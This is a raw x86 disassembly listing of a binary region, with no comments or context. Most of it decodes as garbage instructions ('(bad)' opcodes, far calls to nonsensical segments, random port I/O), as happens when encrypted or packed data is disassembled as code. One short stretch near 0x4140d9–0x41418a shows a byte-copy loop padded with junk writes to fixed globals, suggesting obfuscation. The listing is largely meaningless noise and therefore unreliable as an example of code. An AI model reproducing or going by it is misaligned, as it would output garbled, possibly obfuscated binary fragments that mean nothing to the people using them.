  4139ea:	add    eax,0xf3fa377a
  4139ef:	repz sub esp,DWORD PTR ds:0x6ac08b8c
  4139f6:	jnp    0x4139b0
  4139f8:	out    0x91,al
  4139fa:	pop    es
  4139fb:	xchg   ecx,eax
  4139fc:	fst    DWORD PTR [ebx-0x79]
  4139ff:	nop
  413a00:	or     edx,DWORD PTR [ecx]
  413a02:	shr    DWORD PTR [ecx+edx*1],1
  413a05:	xor    eax,0xb85235c5
  413a0a:	mov    esi,DWORD PTR ds:0xe6363a50
  413a10:	int3   
  413a11:	in     al,dx
  413a12:	call   0x9f24:0x7f5402d6
  413a19:	push   es
  413a1a:	ficom  DWORD PTR [edx]
  413a1c:	mov    ebp,DWORD PTR [ebx]
  413a1e:	fcom   DWORD PTR [ebp+0x36293ad7]
  413a24:	cmp    bh,BYTE PTR [ebx+edx*8-0x6b]
  413a28:	(bad)  
  413a29:	xor    edx,0x78
  413a2c:	aas    
  413a2d:	xlat   BYTE PTR ds:[ebx]
  413a2e:	inc    esi
  413a2f:	pop    ss
  413a30:	cmp    DWORD PTR [ecx+ebx*8+0x3f8d2e29],ebx
  413a37:	jge    0x413a30
  413a39:	pop    eax
  413a3a:	das    
  413a3b:	add    eax,0x64d42f4d
  413a40:	xor    bh,BYTE PTR [ecx+ecx*1+0x7226fd7a]
  413a47:	test   ch,cl
  413a49:	mov    ebp,0x5df54052
  413a4e:	cmp    DWORD PTR [ebp+eiz*1-0x3e0af6a4],esp
  413a55:	mov    ds:0x6f354c85,al
  413a5a:	repz jge 0x413a4c
  413a5d:	jne    0x413ac5
  413a5f:	jne    0x413a6c
  413a61:	jb     0x413a3c
  413a63:	dec    ebp
  413a64:	inc    ebp
  413a65:	pop    ebp
  413a66:	cmp    al,0x17
  413a68:	pop    eax
  413a69:	mov    ds:0x365c43eb,eax
  413a6e:	ds mov esi,0x9541d55c
  413a74:	(bad)  
  413a75:	fistp  WORD PTR [ecx-0x47526ce2]
  413a7b:	or     al,0x54
  413a7d:	mov    ebp,0x161e74e6
  413a82:	mov    eax,0x19ada223
  413a87:	dec    esi
  413a88:	push   es
  413a89:	jl     0x413a72
  413a8b:	lahf   
  413a8c:	add    al,0x87
  413a8e:	add    esi,esi
  413a90:	stos   DWORD PTR es:[edi],eax
  413a91:	xchg   esi,eax
  413a92:	outs   dx,BYTE PTR ds:[esi]
  413a93:	mov    bh,BYTE PTR [esi+edx*4+0x48]
  413a97:	test   eax,0xfed4f970
  413a9c:	adc    al,al
  413a9e:	call   0x828fbfa3
  413aa3:	pusha  
  413aa4:	bound  ebx,QWORD PTR ds:0xdce34f78
  413aaa:	aas    
  413aab:	mov    bl,0x20
  413aad:	loop   0x413a3a
  413aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ab0:	xchg   dl,dh
  413ab2:	mov    ds:0xb6ad63a2,al
  413ab7:	(bad)  [ebx+eax*2]
  413aba:	mov    eax,0x3fe8dbf9
  413abf:	and    BYTE PTR [ebp-0x7d],dl
  413ac2:	add    esi,ecx
  413ac4:	dec    ecx
  413ac5:	push   0xfffffffa
  413ac7:	call   0xa320:0x8f621d14
  413ace:	cmp    al,bh
  413ad0:	xchg   esi,eax
  413ad1:	sbb    DWORD PTR [edi+esi*8],ecx
  413ad4:	repnz pop eax
  413ad6:	sti    
  413ad7:	ss loope 0x413afe
  413ada:	xchg   edi,eax
  413adb:	rcl    dh,cl
  413add:	mov    esp,ebp
  413adf:	add    bl,dh
  413ae1:	or     BYTE PTR [edx-0x3148bf62],0xa
  413ae8:	(bad)  
  413ae9:	fisttp DWORD PTR [ecx-0x4f]
  413aec:	push   0xffffffae
  413aee:	cli    
  413aef:	mov    al,0x40
  413af1:	fwait
  413af2:	adc    dl,ah
  413af4:	xchg   ebx,eax
  413af5:	add    cl,dh
  413af7:	daa    
  413af8:	push   ebx
  413af9:	adc    BYTE PTR [eax+ebx*1-0x6],dl
  413afd:	or     dl,bh
  413aff:	push   0xb14737aa
  413b04:	(bad)  
  413b05:	or     eax,0x53f6ee05
  413b0a:	adc    bl,ch
  413b0c:	sbb    BYTE PTR [esi],cl
  413b0e:	loop   0x413ab2
  413b10:	add    al,0xf
  413b12:	std    
  413b13:	sahf   
  413b14:	inc    esp
  413b15:	popa   
  413b16:	adc    bl,BYTE PTR [ecx-0x14]
  413b19:	dec    esi
  413b1a:	jp     0x413b02
  413b1c:	sub    al,0x1c
  413b1e:	jecxz  0x413aa1
  413b20:	adc    eax,0xb5ef85f9
  413b25:	mov    ebp,edx
  413b27:	jmp    0x413ba5
  413b29:	push   cs
  413b2a:	int    0xbc
  413b2c:	mov    cl,0xc
  413b2e:	or     ebx,DWORD PTR [ecx+0x6b]
  413b31:	adc    DWORD PTR [ecx-0x1fc52dd4],esp
  413b37:	in     eax,dx
  413b38:	add    BYTE PTR [eax+0x3e],dl
  413b3b:	or     DWORD PTR [edx-0x68d7b910],edi
  413b41:	pop    esp
  413b42:	adc    eax,ebx
  413b44:	sbb    ecx,DWORD PTR [esi+0x42c84ffd]
  413b4a:	sar    DWORD PTR [ecx-0x80],0x5
  413b4e:	or     dl,bl
  413b50:	mov    ch,0xcf
  413b52:	mov    edi,0xa9c41a99
  413b57:	xchg   edx,eax
  413b58:	and    eax,0x846eaa4b
  413b5d:	push   esp
  413b5e:	je     0x413b1b
  413b60:	das    
  413b61:	bound  edi,QWORD PTR [edx-0x6]
  413b64:	push   esi
  413b65:	mov    edi,0xb89b294d
  413b6a:	jnp    0x413ba1
  413b6c:	pushf  
  413b6d:	and    dl,BYTE PTR [esi]
  413b6f:	shl    DWORD PTR [esi+0x5],1
  413b72:	mov    esi,DWORD PTR [eax+0x19]
  413b75:	mov    BYTE PTR [ecx+0x3da0a064],dh
  413b7b:	or     al,0x40
  413b7d:	inc    ecx
  413b7e:	adc    bh,BYTE PTR [ecx-0x46]
  413b81:	add    DWORD PTR [edi+0x67a429ee],edx
  413b87:	mov    ebp,0x3108a818
  413b8c:	test   DWORD PTR [eax],esi
  413b8e:	bound  edi,QWORD PTR [eax-0x22]
  413b91:	xor    dl,BYTE PTR [esi+0x7503e8d8]
  413b97:	stos   BYTE PTR es:[edi],al
  413b98:	es dec esp
  413b9a:	add    eax,0x4cc0b4fe
  413b9f:	sub    bh,al
  413ba1:	xchg   ecx,eax
  413ba2:	ret    0x58f6
  413ba5:	xchg   ecx,eax
  413ba6:	cmp    eax,0x6026f95c
  413bab:	dec    eax
  413bac:	icebp  
  413bad:	xor    DWORD PTR [esi+0x446199f2],ebx
  413bb3:	inc    ecx
  413bb4:	ror    BYTE PTR [eax+0x2],0x7b
  413bb8:	mov    bl,0xc9
  413bba:	out    0x2b,al
  413bbc:	mov    al,ds:0x542ae431
  413bc1:	aaa    
  413bc2:	sub    eax,0xb7239376
  413bc7:	popa   
  413bc8:	lods   al,BYTE PTR ds:[esi]
  413bc9:	das    
  413bca:	cmp    DWORD PTR [edi-0x5f],ebx
  413bcd:	add    DWORD PTR [edi-0x8],edi
  413bd0:	lahf   
  413bd1:	or     BYTE PTR [edx+0x5c],al
  413bd4:	mov    ebp,0x91de8d84
  413bd9:	test   eax,0x3f314368
  413bde:	mov    dl,0x20
  413be0:	int    0x4e
  413be2:	push   ebx
  413be3:	mov    dl,0xdb
  413be5:	dec    al
  413be7:	xor    dh,al
  413be9:	sbb    ch,ch
  413beb:	call   0x3d17379e
  413bf0:	jnp    0x413c56
  413bf2:	into   
  413bf3:	push   ebx
  413bf4:	rol    BYTE PTR [ebp-0x75263147],1
  413bfa:	std    
  413bfb:	rcl    DWORD PTR [eax+esi*4+0x70],0x93
  413c00:	cs mov al,0xeb
  413c03:	ja     0x413b98
  413c05:	ds (bad) 
  413c07:	fst    QWORD PTR ds:0x31b85fb8
  413c0d:	jmp    0x3e42c345
  413c12:	pop    ecx
  413c13:	mov    esp,0x88fc031c
  413c18:	or     BYTE PTR [ecx],0xc5
  413c1b:	sub    cl,BYTE PTR [eax+0x2d26bf9d]
  413c21:	inc    esi
  413c22:	or     bh,BYTE PTR [ebx]
  413c24:	fiadd  WORD PTR [eax]
  413c26:	mov    ds:0xf1f8d5e2,eax
  413c2b:	sub    eax,0x9c162011
  413c30:	or     BYTE PTR [ebp-0x78d09b1],0x1a
  413c37:	xchg   si,ax
  413c39:	aaa    
  413c3a:	sub    eax,0x8cacec6d
  413c3f:	das    
  413c40:	sbb    eax,0x6e301669
  413c45:	push   ds
  413c46:	mov    dh,0x29
  413c48:	pop    es
  413c49:	loop   0x413caa
  413c4b:	int    0x6f
  413c4d:	(bad)  
  413c4e:	pop    esi
  413c4f:	adc    al,cl
  413c51:	sar    DWORD PTR [ebp+esi*1+0x4a],1
  413c55:	aad    0x97
  413c57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c58:	cmp    BYTE PTR [ebp+0x1ea23fe1],al
  413c5e:	bound  esp,QWORD PTR [edx+esi*8]
  413c61:	xchg   BYTE PTR fs:[ebx+0x7d5886c3],cl
  413c68:	ds jp  0x413c31
  413c6b:	ins    BYTE PTR es:[edi],dx
  413c6c:	adc    DWORD PTR [esi],ecx
  413c6e:	inc    edx
  413c6f:	fist   DWORD PTR [edi]
  413c71:	call   0xe2c1:0xa3f6410e
  413c78:	pop    edi
  413c79:	xor    ebp,edx
  413c7b:	add    DWORD PTR [edx+0x160decf3],edx
  413c81:	pop    ds
  413c82:	xor    ebp,DWORD PTR [esi]
  413c84:	leave  
  413c85:	ret    
  413c86:	or     ah,BYTE PTR [edx+0x17]
  413c89:	cld    
  413c8a:	es jmp 0x4347:0x4820a28c
  413c92:	inc    esi
  413c93:	repnz loopne 0x413cd0
  413c96:	sub    eax,ebp
  413c98:	pusha  
  413c99:	gs jbe 0x413cb0
  413c9c:	inc    edx
  413c9d:	mov    dl,0x8a
  413c9f:	inc    ecx
  413ca0:	repnz addr16 pusha 
  413ca3:	idiv   edi
  413ca5:	mov    ds:0x8a28c9ee,eax
  413caa:	adc    BYTE PTR [edx],bl
  413cac:	sub    al,0x1d
  413cae:	imul   DWORD PTR [ebx-0x6dbb27c8]
  413cb4:	inc    ecx
  413cb5:	xor    BYTE PTR [edi+0x52],al
  413cb8:	mov    al,ds:0x1e997a52
  413cbd:	icebp  
  413cbe:	aad    0x6b
  413cc0:	std    
  413cc1:	pop    ebp
  413cc2:	test   dh,ch
  413cc4:	daa    
  413cc5:	cwde   
  413cc6:	loope  0x413cd7
  413cc8:	jge    0x413cee
  413cca:	sub    DWORD PTR [esi],eax
  413ccc:	cmp    BYTE PTR [edx+0x69fa8729],dh
  413cd2:	mov    eax,0x998116f7
  413cd7:	or     dh,ah
  413cd9:	and    al,0xf8
  413cdb:	dec    edi
  413cdc:	or     eax,0x2d304058
  413ce1:	shr    DWORD PTR [edx-0x4c7dee58],cl
  413ce7:	ficomp WORD PTR [esp+ecx*2-0x14098e63]
  413cee:	addr16 pop eax
  413cf0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413cf1:	(bad)  
  413cf2:	outs   dx,DWORD PTR ds:[esi]
  413cf3:	cs repnz and ah,BYTE PTR ss:[eax+0x17]
  413cf9:	fwait
  413cfa:	push   0x7f
  413cfc:	or     al,0x30
  413cfe:	add    ecx,ebp
  413d00:	(bad)  
  413d01:	jae    0x413c91
  413d03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d04:	inc    edx
  413d05:	retf   0x58c0
  413d08:	lds    esp,FWORD PTR [esi]
  413d0a:	push   esp
  413d0b:	mov    ch,0x7e
  413d0d:	test   al,0x42
  413d0f:	jno    0x413d17
  413d11:	push   eax
  413d12:	jle    0x413d0f
  413d14:	inc    edx
  413d15:	fs mov edi,0xd36b7e0b
  413d1b:	inc    edi
  413d1c:	popf   
  413d1d:	pop    ecx
  413d1e:	retf   0x1081
  413d21:	sbb    eax,ecx
  413d23:	adc    DWORD PTR [ebx+0x7d],0x67
  413d27:	sbb    DWORD PTR [ebp+edi*4+0x63],eax
  413d2b:	mov    ds:0x958719b1,eax
  413d30:	fwait
  413d31:	ins    BYTE PTR es:[edi],dx
  413d32:	outs   dx,BYTE PTR ds:[esi]
  413d33:	pop    edx
  413d34:	bound  esp,QWORD PTR [edx]
  413d36:	pcmpgtd mm4,QWORD PTR [eax-0x19]
  413d3a:	and    DWORD PTR [esi+0x56],eax
  413d3d:	push   cs
  413d3e:	stos   BYTE PTR es:[edi],al
  413d3f:	js     0x413d99
  413d41:	jp     0x413cde
  413d43:	int    0xdc
  413d45:	add    al,0xd0
  413d47:	adc    BYTE PTR [ebx+0x4659583a],ch
  413d4d:	jg     0x413d9f
  413d4f:	inc    ebp
  413d50:	jmp    0x8e2c1a1e
  413d55:	call   0xbbc0:0x4611f4ea
  413d5c:	cmp    DWORD PTR [edx+ecx*1-0x4e0c3236],ebp
  413d63:	outs   dx,BYTE PTR ds:[esi]
  413d64:	nop
  413d65:	fist   DWORD PTR [ecx]
  413d67:	and    BYTE PTR [eax],bl
  413d69:	fdivp  st(2),st
  413d6b:	adc    BYTE PTR [eax],bl
  413d6d:	lods   eax,DWORD PTR ds:[esi]
  413d6e:	pop    ebp
  413d6f:	sbb    eax,DWORD PTR [ebx+0x2b34a857]
  413d75:	test   DWORD PTR [ecx+0x5b669efe],0x915bc47f
  413d7f:	jle    0x413d0a
  413d81:	cld    
  413d82:	xchg   edi,eax
  413d83:	push   ecx
  413d84:	cmp    esi,DWORD PTR [edx+0x2c211a53]
  413d8a:	icebp  
  413d8b:	add    BYTE PTR [esi],dl
  413d8d:	aam    0xfb
  413d8f:	in     eax,0x35
  413d91:	call   0x47a7:0x3ec32a16
  413d98:	imul   esi,DWORD PTR [eax],0x40db4090
  413d9e:	repnz push ebx
  413da0:	(bad)
  413da3:	into   
  413da4:	mov    ch,0x54
  413da6:	pop    ebx
  413da7:	sub    al,0xea
  413da9:	xchg   esi,eax
  413daa:	mov    eax,DWORD PTR [edi+0x7d]
  413dad:	out    dx,eax
  413dae:	adc    BYTE PTR [eax],al
  413db0:	mov    bl,0x30
  413db2:	arpl   WORD PTR [esi],cx
  413db4:	(bad)  
  413db6:	sub    eax,DWORD PTR [edi]
  413db8:	jmp    0xa698dac6
  413dbd:	fidivr WORD PTR [esi]
  413dbf:	xchg   BYTE PTR [edx+0x49f2bf23],ch
  413dc5:	or     al,0x77
  413dc7:	jecxz  0x413e02
  413dc9:	jecxz  0x413d52
  413dcb:	sbb    BYTE PTR [esi-0x4a0f8ad6],cl
  413dd1:	lods   eax,DWORD PTR ds:[esi]
  413dd2:	and    BYTE PTR [edx-0x22],0x40
  413dd6:	push   edi
  413dd7:	push   cs
  413dd8:	jmp    0x413e4c
  413dda:	ja     0x413e36
  413ddc:	nop
  413ddd:	scas   al,BYTE PTR es:[edi]
  413dde:	inc    edi
  413ddf:	(bad)  
  413de0:	and    ebp,DWORD PTR [esi+eax*2+0x58]
  413de4:	lea    ebp,[ebx+eiz*2+0x4f]
  413de8:	sbb    BYTE PTR [ebp-0x53],ch
  413deb:	outs   dx,DWORD PTR ds:[esi]
  413dec:	loopne 0x413e39
  413dee:	adc    edi,DWORD PTR ds:0x9d4c3290
  413df4:	lods   eax,DWORD PTR ds:[esi]
  413df5:	jno    0x413e4c
  413df7:	sbb    eax,DWORD PTR [ebx]
  413df9:	loope  0x413dbd
  413dfb:	in     eax,dx
  413dfc:	mov    eax,ds:0x53a4f1f1
  413e01:	(bad)
  413e05:	adc    DWORD PTR [ecx+esi*1-0x51],esi
  413e09:	xchg   ebp,eax
  413e0a:	adc    DWORD PTR [edx],0x82cf0baa
  413e10:	hlt    
  413e11:	cmp    BYTE PTR [esp],dl
  413e14:	idiv   eax
  413e16:	(bad)
  413e19:	fbstp  TBYTE PTR [edi-0x3b26cbbe]
  413e1f:	pop    ecx
  413e20:	inc    ebp
  413e21:	repnz loopne 0x413e12
  413e24:	jmp    0xb69e:0xb48a50aa
  413e2b:	inc    ecx
  413e2c:	fsubr  DWORD PTR [ecx-0x26]
  413e2f:	adc    DWORD PTR [edx-0x5d01aafc],edx
  413e35:	inc    ah
  413e37:	lock mov edi,0xa3911bfe
  413e3d:	jg     0x413e7d
  413e3f:	and    DWORD PTR [esi],esi
  413e41:	sub    dh,BYTE PTR [eax]
  413e43:	enter  0xfd0b,0xe4
  413e47:	pop    ds
  413e48:	push   ds
  413e49:	mov    esp,0x1cda2e9
  413e4e:	fisub  DWORD PTR [eax-0x4e]
  413e51:	imul   eax,eax,0x76
  413e54:	add    dh,ch
  413e56:	lds    ecx,FWORD PTR [esi]
  413e58:	int3   
  413e59:	sahf   
  413e5a:	stos   DWORD PTR es:[edi],eax
  413e5b:	movd   DWORD PTR [edi-0x49],mm0
  413e5f:	mov    ebx,0x4621305
  413e64:	in     eax,dx
  413e65:	pop    esp
  413e66:	sub    edx,DWORD PTR [eax-0x25]
  413e69:	mov    ebx,0x55c0177b
  413e6e:	movlps QWORD PTR ds:0xf50a6b05,xmm4
  413e75:	stos   BYTE PTR es:[edi],al
  413e76:	daa    
  413e77:	push   0xb9e20ace
  413e7c:	je     0x413e16
  413e7e:	and    al,ah
  413e80:	popa   
  413e81:	or     eax,0x411641da
  413e86:	push   esi
  413e87:	test   eax,0x2046ed7e
  413e8c:	test   eax,0x8f042937
  413e91:	pop    eax
  413e92:	jecxz  0x413e21
  413e94:	lods   eax,DWORD PTR ds:[esi]
  413e95:	fbld   TBYTE PTR [ecx+0x133275da]
  413e9b:	mov    esp,0xccedcafc
  413ea0:	xchg   DWORD PTR [edi],ebx
  413ea2:	add    dh,BYTE PTR [edx-0x20dcffdb]
  413ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ea9:	int    0x32
  413eab:	jmp    0x413ec1
  413ead:	xor    eax,0xd13307c6
  413eb2:	popf   
  413eb3:	jmp    0xf3d5d7d4
  413eb8:	stc    
  413eb9:	and    eax,0xba9192a3
  413ebe:	enter  0xda8b,0xc7
  413ec2:	in     al,dx
  413ec3:	fstp   QWORD PTR cs:[esi+0x63]
  413ec7:	dec    edi
  413ec8:	sub    al,0x4d
  413eca:	outs   dx,DWORD PTR ds:[esi]
  413ecb:	add    esp,DWORD PTR [edi-0x6ef44db]
  413ed1:	add    edx,ebp
  413ed3:	or     dl,bh
  413ed5:	add    al,0x38
  413ed7:	add    al,0x9f
  413ed9:	fcmovne st,st(0)
  413edb:	std    
  413edc:	add    BYTE PTR [eax-0x398fadd4],0xf1
  413ee3:	addr16 aaa 
  413ee5:	push   esp
  413ee6:	cdq    
  413ee7:	aad    0xde
  413ee9:	xchg   DWORD PTR [esi+0x15c962a7],ebp
  413eef:	retf   0x5dbb
  413ef2:	fucomi st,st(0)
  413ef4:	loope  0x413f55
  413ef6:	call   0xf78d7ab
  413efb:	jno    0x413e86
  413efd:	mov    cl,0x6e
  413eff:	test   eax,0x7d1461d0
  413f04:	aas    
  413f05:	inc    esp
  413f06:	dec    edx
  413f07:	mov    eax,ds:0x35f6ebb1
  413f0c:	(bad)  
  413f0d:	jae    0x413f70
  413f0f:	jge    0x413ed9
  413f11:	jns    0x413f85
  413f13:	arpl   di,si
  413f15:	idiv   BYTE PTR [edi+eiz*4-0x22]
  413f19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f1a:	jmp    0xd2af:0x75202c42
  413f21:	or     edi,esp
  413f23:	outs   dx,BYTE PTR ds:[esi]
  413f24:	cmp    dl,bl
  413f26:	push   esi
  413f27:	aam    0xbd
  413f29:	pop    esi
  413f2a:	add    BYTE PTR [edi+edx*4-0x22],0xae
  413f2f:	dec    ebx
  413f30:	je     0x413ee0
  413f32:	pop    esi
  413f33:	fsub   QWORD PTR [ebp-0x12]
  413f36:	push   es
  413f37:	xchg   ebp,eax
  413f38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f39:	loope  0x413f2d
  413f3b:	(bad)  
  413f3c:	and    ebp,edx
  413f3e:	adc    DWORD PTR [ecx+0x11d1a884],0x7cec6aec
  413f48:	outs   dx,BYTE PTR ds:[esi]
  413f49:	aad    0xb5
  413f4b:	mov    ebx,0xd04097fd
  413f50:	imul   edi,eax,0xffffffd8
  413f53:	dec    bl
  413f55:	rcl    DWORD PTR ds:0x9f44149c,1
  413f5b:	cmp    al,0x5f
  413f5d:	push   0xb2c1136d
  413f62:	inc    ebx
  413f63:	lahf   
  413f64:	(bad)  
  413f65:	out    0x8d,eax
  413f67:	xchg   ch,dl
  413f69:	sti    
  413f6a:	test   BYTE PTR [esi+0x69633013],dl
  413f70:	les    ebx,FWORD PTR [ecx+0x46f5bee5]
  413f76:	jge    0x413f71
  413f78:	sahf   
  413f79:	pop    es
  413f7a:	push   0x22
  413f7c:	leave  
  413f7d:	adc    DWORD PTR [eax+0x6e],0x4e55f489
  413f84:	sub    dh,BYTE PTR [edi-0xe]
  413f87:	loop   0x413f70
  413f89:	xchg   edi,eax
  413f8a:	in     al,0x59
  413f8c:	imul   edi,DWORD PTR [eax+0x46],0x52
  413f90:	bound  ecx,QWORD PTR [ebp+edi*1-0x6d336e77]
  413f97:	imul   ecx,DWORD PTR ds:0x51a9e2ee,0xc8d665a1
  413fa1:	nop
  413fa2:	pop    esp
  413fa3:	shl    BYTE PTR [ebp-0x70],0xfc
  413fa7:	fcomip st,st(3)
  413fa9:	dec    DWORD PTR [ecx]
  413fab:	stc    
  413fac:	xchg   edi,eax
  413fad:	dec    ecx
  413fae:	and    eax,0x1349aa1
  413fb3:	cmp    eax,0xd8c147f5
  413fb8:	xor    DWORD PTR [si+0xa],ebp
  413fbc:	cli    
  413fbd:	shl    BYTE PTR [eax-0x3d24b2f4],0xcc
  413fc4:	call   0x71bec96b
  413fc9:	js     0x413f5d
  413fcb:	pop    edx
  413fcc:	ret    
  413fcd:	out    dx,eax
  413fce:	cmp    eax,DWORD PTR [eax+0x53]
  413fd1:	mov    eax,ds:0xa6abc313
  413fd6:	or     ah,BYTE PTR [edx+0x2f]
  413fd9:	or     esi,DWORD PTR [ebp+0x3769bcb5]
  413fdf:	xchg   ebp,eax
  413fe0:	adc    edi,DWORD PTR [ebx]
  413fe2:	inc    ecx
  413fe3:	push   edi
  413fe4:	dec    ecx
  413fe5:	aam    0xff
  413fe7:	dec    ebx
  413fe8:	and    DWORD PTR [eax+0x47],esp
  413feb:	stos   DWORD PTR es:[edi],eax
  413fec:	aaa    
  413fed:	ja     0x413f79
  413fef:	sub    al,0x10
  413ff1:	(bad)  
  413ff2:	ja     0x413fc5
  413ff4:	outs   dx,DWORD PTR ds:[esi]
  413ff5:	mov    ch,0x88
  413ff7:	imul   ecx,DWORD PTR [ebx-0x15d9a5d7],0x8ad7bd15
  414001:	and    bh,dh
  414003:	inc    ebx
  414004:	sar    BYTE PTR [edx+0x6cf404ce],cl
  41400a:	popf   
  41400b:	inc    edx
  41400c:	add    bh,BYTE PTR [ebp+0xf]
  41400f:	cwde   
  414010:	or     ch,bh
  414012:	(bad)  
  414013:	ins    BYTE PTR es:[edi],dx
  414014:	ret    0x749b
  414017:	ror    BYTE PTR gs:[eax],0x31
  41401b:	in     eax,0x6b
  41401d:	shl    DWORD PTR [edi+0x5ac27cae],1
  414023:	xor    al,0x3f
  414025:	ja     0x414092
  414027:	push   ecx
  414028:	loope  0x414074
  41402a:	das    
  41402b:	out    dx,eax
  41402c:	jge    0x413fda
  41402e:	stos   BYTE PTR es:[edi],al
  41402f:	in     al,0xcc
  414031:	sbb    BYTE PTR [ebx],ah
  414033:	ja     0x414001
  414035:	psubsb mm7,QWORD PTR [ebp+esi*2+0x15d67af0]
  41403d:	leave  
  41403e:	int3   
  41403f:	sbb    esi,DWORD PTR [ecx-0x78]
  414042:	mov    ebp,0x702e313
  414047:	inc    edx
  414048:	fbstp  TBYTE PTR [edi]
  41404a:	sbb    dh,bl
  41404c:	lea    eax,fs:[eax-0x27]
  414050:	jle    0x414095
  414052:	push   edi
  414053:	aad    0x19
  414055:	gs enter 0xa2d4,0x52
  41405a:	int    0x29
  41405c:	in     eax,dx
  41405d:	scas   al,BYTE PTR es:[edi]
  41405e:	into   
  41405f:	ror    DWORD PTR [edi],cl
  414061:	fistp  DWORD PTR [ecx+0x4e]
  414064:	mov    dl,0x6b
  414066:	mov    bh,0x39
  414068:	pop    esp
  414069:	sbb    ebp,edx
  41406b:	aad    0xc0
  41406d:	loop   0x41402f
  41406f:	xchg   edx,eax
  414070:	add    eax,0x1da37cd5
  414075:	stos   DWORD PTR es:[edi],eax
  414076:	loop   0x41405a
  414078:	mov    ds:0xb139b78b,al
  41407d:	push   eax
  41407e:	ins    DWORD PTR es:[edi],dx
  41407f:	and    bl,BYTE PTR [ebx+0x1e]
  414082:	jnp    0x41409e
  414084:	push   ebp
  414085:	das    
  414086:	pop    ds
  414087:	cmp    eax,0xc2cddadd
  41408c:	adc    eax,0x5a87cf78
  414091:	add    BYTE PTR [edi+ebx*4],0x2d
  414095:	call   0x596d:0xda238daf
  41409c:	mov    ds:0x1b7c1c17,al
  4140a1:	sub    eax,0x182a444a
  4140a6:	inc    esi
  4140a7:	(bad)  
  4140a8:	loopne 0x414059
  4140aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140ab:	and    eax,0x300befd9
  4140b0:	push   es
  4140b1:	inc    edx
  4140b2:	and    ebx,DWORD PTR [ecx+0x24ea3bb4]
  4140b8:	ret    
  4140b9:	jne    0x414117
  4140bb:	ret    0x4119
  4140be:	daa    
  4140bf:	out    dx,eax
  4140c0:	retf   0xccea
  4140c3:	push   0x36b00746
  4140c8:	cmp    DWORD PTR [eax+esi*4+0x6408a62b],eax
  4140cf:	fsub   st,st(6)
  4140d1:	add    eax,0xafb85603
  4140d6:	or     BYTE PTR [ecx+0x7],dl
  4140d9:	and    DWORD PTR ds:0x428e2b,ebx
  4140df:	xor    ecx,eax
  4140e1:	mov    esi,0x3272f6
  4140e6:	adc    DWORD PTR ds:0x428e4b,0x428e8b
  4140f0:	push   edi
  4140f1:	add    ecx,esi
  4140f3:	jmp    0x414117
  4140f8:	mov    DWORD PTR ds:0x428e8b,0x6fd6
  414102:	mov    dl,BYTE PTR [ebp-0x1]
  414105:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  41410c:	mov    DWORD PTR ds:0x428e83,0x304c
  414116:	inc    ecx
  414117:	cmp    ecx,0x40
  41411a:	jb     0x4140f8
  414120:	mov    edx,DWORD PTR [ebp-0x18]
  414123:	and    DWORD PTR ds:0x428e93,0x604b
  41412d:	xor    edx,eax
  41412f:	add    edx,esi
  414131:	mov    DWORD PTR ds:0x428e57,0x4fc2
  41413b:	jmp    0x416578
  414140:	and    ecx,edi
  414142:	mov    edi,DWORD PTR [ebp+0x8]
  414145:	neg    ecx
  414147:	mov    ecx,0x8a9b
  41414c:	and    DWORD PTR ds:0x428ecf,0x428ec3
  414156:	xor    cx,WORD PTR [edi+edx*4+0x2]
  41415b:	mov    DWORD PTR ds:0x428eaf,0x4944
  414165:	mov    edi,0x3b5d
  41416a:	and    DWORD PTR ds:0x428ea7,0x428e4b
  414174:	add    cx,di
  414177:	movzx  ecx,cx
  41417a:	xor    DWORD PTR ds:0x428e67,0x5c37
  414184:	mov    DWORD PTR [ebp-0xc],ecx
  414187:	mov    ecx,DWORD PTR [ebp+0x8]
  41418a:	jmp    0x416543
  41418f:	lea    edi,[esp+ebp*8]
  414192:	sub    ecx,esp
  414194:	stos   DWORD PTR es:[edi],eax
  414195:	test   BYTE PTR [edx+ecx*1-0x2295c7a7],dl
  41419c:	mov    edx,ds
  41419e:	(bad)  
  41419f:	xchg   ebp,eax
  4141a0:	push   0x60e78382
  4141a5:	add    DWORD PTR [ebx+0x5301db63],0xffffffe9
  4141ac:	in     al,0x45
  4141ae:	outs   dx,DWORD PTR ds:[esi]
  4141af:	inc    esi
  4141b0:	mov    esp,0xef7bbdf6
  4141b5:	lods   al,BYTE PTR ds:[esi]
  4141b6:	(bad)  
  4141b7:	jecxz  0x4141c7
  4141b9:	mov    bh,0xa6
  4141bb:	retf   0xe05f
  4141be:	xor    BYTE PTR ds:0x90722eec,dl
  4141c4:	fs xor dh,0x3e
  4141c8:	cmp    BYTE PTR [eax-0x3d],ch
  4141cb:	test   BYTE PTR [ecx-0x4],bh
  4141ce:	xchg   ebx,eax
  4141cf:	mov    ds:0x779e4335,eax
  4141d4:	bound  esp,QWORD PTR [esi+0x8a16f23]
  4141da:	and    ebp,DWORD PTR es:[ecx+0x12]
  4141de:	fld    DWORD PTR [edx-0x2a]
  4141e1:	xor    BYTE PTR [ebx-0x75],ah
  4141e4:	inc    eax
  4141e5:	fsubr  QWORD PTR [ebp+ebx*4+0x37]
  4141e9:	or     al,0x85
  4141eb:	add    bl,bh
  4141ed:	add    al,0x4e
  4141ef:	pop    ecx
  4141f0:	int3   
  4141f1:	call   0xa6e3:0x84165439
  4141f8:	cmp    DWORD PTR [esi],eax
  4141fa:	add    eax,0xb435f7b9
  4141ff:	add    edi,esp
  414201:	jae    0x4141ae
  414203:	xchg   ecx,eax
  414204:	mov    edi,0xc50d5cdd
  414209:	mov    dl,0x66
  41420b:	jae    0x4141b5
  41420d:	std    
  41420e:	scas   al,BYTE PTR es:[edi]
  41420f:	stos   DWORD PTR es:[edi],eax
  414210:	stos   DWORD PTR es:[edi],eax
  414211:	loop   0x414232
  414213:	sti    
  414214:	jnp    0x4141ca
  414216:	add    BYTE PTR [ebx+0x733d4fe4],0x33
  41421d:	jno    0x414220
  41421f:	add    BYTE PTR [eax+0x52e5a2e5],ch
  414225:	xlat   BYTE PTR ds:[ebx]
  414226:	inc    ecx
  414227:	mov    eax,ds:0xae28540f
  41422c:	mov    dh,BYTE PTR [esi+0x5a]
